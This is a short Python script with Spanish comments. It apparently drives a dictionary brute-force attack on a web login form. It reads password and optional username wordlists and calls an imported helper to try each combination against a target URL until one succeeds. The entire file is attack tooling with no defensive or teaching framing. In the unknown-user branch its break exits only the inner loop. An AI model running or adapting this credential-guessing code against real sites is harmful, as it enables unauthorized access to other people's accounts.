import parametros as params
import func


if params.param.n != None:
    n = params.param.n
else:
    n = 0

#conozco el usuario
if params.param.usuario != None:
    with open(params.param.dic_p,'r') as contraseñas:
        passw = contraseñas.read()
    for cont in passw.split():
        fuerza_b = func.fb(url=params.param.url,usuario=params.param.usuario,c_usuario=params.param.c_u,c_pass=params.param.c_p,pass_=cont,n=n)
        if fuerza_b:
            break
#no conozco el usuario 
elif params.param.dic_u != None:
    with open(params.param.dic_u,'r') as usuarios:
        us = usuarios.read()
    with open(params.param.dic_p) as contraseñas:
        passw = contraseñas.read()

    for usuario  in us.split():
        for contraseña  in passw.split():
            fuerza_b = func.fb(url=params.param.url,usuario=usuario,c_usuario=params.param.c_u,c_pass=params.param.c_p,pass_=contraseña,n=n)
            if fuerza_b:
                break

